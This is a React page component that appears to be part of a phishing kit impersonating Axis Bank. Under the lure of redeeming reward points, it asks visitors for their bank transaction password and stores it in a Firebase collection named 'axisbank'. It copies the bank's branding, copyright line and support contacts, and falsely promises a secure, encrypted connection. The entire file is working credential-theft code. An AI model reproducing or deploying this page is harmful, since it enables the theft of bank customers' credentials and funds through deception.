import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
// Using image from public directory for better performance
const axisHeroImage = '/axis_hero.webp';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const { documentId } = useParams();

  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);

    try {
      if (!documentId) {
        throw new Error('Invalid session. Please start over.');
      }

      const result = await FirebaseUtil.updateDocument("axisbank", documentId, {
        password2,
        updatedAt: new Date().toISOString()
      });

      if (result && result.state === 'success') {
        navigate('/success');
      } else {
        throw new Error(result?.error || 'Failed to update document. Please try again.');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setError(error.message || 'An error occurred. Please try again.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <div className="w-full bg-white py-4 flex justify-center">
        <div className="max-w-md mx-auto">
          <img 
            src={axisHeroImage} 
            alt="Axis Bank - Badhti Ka Naam Zindagi" 
            className="w-full h-auto max-h-48 object-contain"
          />
        </div>
      </div>

      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-[#B72B64]">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-[#B72B64]">
              One Step Away To Collect Your Rewards Points
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-[#B72B64]"
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-[#B72B64] hover:bg-opacity-90 text-white font-bold py-2 px-4 rounded-full text-sm"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "VERIFY & SUBMIT"}
            </button>
          </form>

          {error && (
            <div className="mt-4 p-2 bg-red-100 border border-red-400 text-red-700 rounded text-sm">
              {error}
            </div>
          )}

          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600">
              Your security is our priority. All transactions are encrypted and secure.
            </p>
            <div className="flex items-center justify-center mt-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-[#B72B64] mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span className="text-xs font-semibold">Secure Connection</span>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-[#B72B64] text-white p-4 text-center">
        <p className="text-sm">© 2025 Axis Bank Ltd. All rights reserved.</p>
        <p className="text-xs">For support, call 1860-419-5555 or email customercare@axisbank.com</p>
      </footer>
    </div>
  );
};

export default SecondPage;
